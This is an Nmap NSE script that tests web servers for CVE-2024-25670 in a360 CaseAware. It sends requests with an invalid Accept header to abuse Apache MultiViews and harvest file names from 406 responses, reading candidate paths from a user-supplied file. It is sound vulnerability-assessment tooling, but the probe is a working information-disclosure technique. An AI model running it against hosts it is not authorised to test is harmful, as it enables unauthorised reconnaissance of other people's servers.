local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"

description = [[
CaseAware - CVE-2024-25670 - a360 CaseAware 23.07.0.1688663266 allows remote attackers to obtain sensitive information about file and directory names because mod_negotiation and MultiViews are used by its Apache HTTP Server.
]]

---
-- @usage nmap --script http-vuln-cve2024-25670 -p 80 <target>
-- @output
-- PORT   STATE SERVICE VERSION
-- 80/tcp open  http
-- | http-vuln-cve2024-25670:
-- |   VULNERABLE:
-- |   a360 CaseAware information disclosure through mod_negotiation and MultiViews abuse
-- |       State: VULNERABLE
-- |     IDs:  CVE:CVE-2024-25670
-- |     Risk factor: Low
-- |       a360 CaseAware 23.07.0.1688663266 allows remote attackers to obtain sensitive information
-- |       about file and directory names because mod_negotiation and MultiViews are used by its Apache HTTP Server.
-- |
-- |     Disclosure date: 2024-02-09
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25670
--
--
-- @args http-vuln-cve2024-25670.file points to the file containing paths to attempt
--
-- @xmloutput
-- <table key="CVE-2024-25670">
-- <elem key="title">a360 CaseAware information disclosure through mod_negotiation and MultiViews abuse</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2024-25670</elem>
-- </table>
-- <table key="description">
-- <elem>a360 CaseAware 23.07.0.1688663266 allows remote attackers to obtain sensitive information about file and directory names because mod_negotiation and MultiViews are used by its Apache HTTP Server.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">09</elem>
-- <elem key="month">02</elem>
-- <elem key="year">2024</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2024-02-09</elem>
-- <table key="check_results">
-- </table>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25670</elem>
-- </table>
-- </table>
--
---

author = "Chapman (R3naissance) Schleiss"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}

portrule = shortport.port_or_service( {80, 443}, {"http", "http-alt", "https"}, "tcp", "open")

action = function(host, port)
  local function get_path(path)
    options = {}
    header = {}
    header['Accept'] = 'not/valid'

    options['timeout'] = 1000
    options['header'] = header

    local uri = "/" .. path

    local response = http.get(host, port, uri, options)
    stdnse.debug1("%s [%s]", uri, response.status)

    if response.status == 406 then
      if string.match(response.body, "%<ul%>(.-)%<%/ul%>") then
        stdnse.debug1("Host is potentially vulnerable. Checking...")
        paths = string.match(response.body, "%<ul%>(.-)%<%/ul%>")
      else
        paths = ""
      end
    else
      paths = ""
    end
  end

  local function check()
    options = {}
    options['timeout'] = 1000

    local uri = "/login.php"

    local response = http.get(host, port, uri, options)
    stdnse.debug1("%s [%s]", uri, response.status)

    if response.status then
      if string.match(response.body, 'CaseAware') then
        stdnse.debug1("Appears to be a CaseWare instance, proceeding with attack...")
        return true
      else
        stdnse.debug1("Does not appear to be a CaseWare instance")
        return false
      end
    else
      stdnse.debug1("Could not connect")
      return false
    end
  end

  local function read_file(path)
    stdnse.debug1("Attempting to read %s", path)
        local file = io.open(path, "r")
        local content = {}
    if not file then
          stdnse.debug1("Failed to read %s. Using version.php instead...", path)
          table.insert(content, "version.php")
          return content
        end
        for line in file:lines() do
      table.insert(content, line)
    end
    file:close()
        stdnse.debug1("Read %s", path)
    return content
  end

  local vuln_table = {
    title = "a360 CaseAware information disclosure through mod_negotiation and MultiViews abuse",
    IDS = {CVE = 'CVE-2024-25670'},
    risk_factor = "Low",
    references = {
        'https://nvd.nist.gov/vuln/detail/CVE-2024-25670',
        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25670'
    },
    dates = {
      disclosure = {year = '2024', month = '02', day = '09'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN
  table.insert(vuln_table.extra_info, string.format("Attempt | Results"))

  if check() then
    if stdnse.get_script_args(SCRIPT_NAME..".file") then
      local file_to_read = stdnse.get_script_args(SCRIPT_NAME..".file")
      local paths_to_test = read_file(file_to_read)
      for k,v in pairs(paths_to_test) do
        if pcall(get_path, v) then
          if string.match(paths, 'href="(.-)"%>') then
            vuln_table.state = vulns.STATE.VULN
            for w in string.gmatch(paths, 'href="(.-)"%>') do
              table.insert(vuln_table.extra_info, string.format("%s | %s", "version.php", w))
            end
          else
            stdnse.debug1("Host is not vulnerable")
          end
        else
          stdnse.debug1("Host does not appear to be vulnerable")
        end
      end
    else
      if pcall(get_path, "version.php") then
        if string.match(paths, 'href="(.-)"%>') then
          vuln_table.state = vulns.STATE.VULN
          for w in string.gmatch(paths, 'href="(.-)"%>') do
            table.insert(vuln_table.extra_info, string.format("%s | %s", "version.php", w))
          end
        else
          stdnse.debug1("Host is not vulnerable")
        end
      else
        stdnse.debug1("Host does not appear to be vulnerable")
      end
    end
    return vuln_report:make_output(vuln_table)
  else
    return vuln_report:make_output(vuln_table)
  end
end
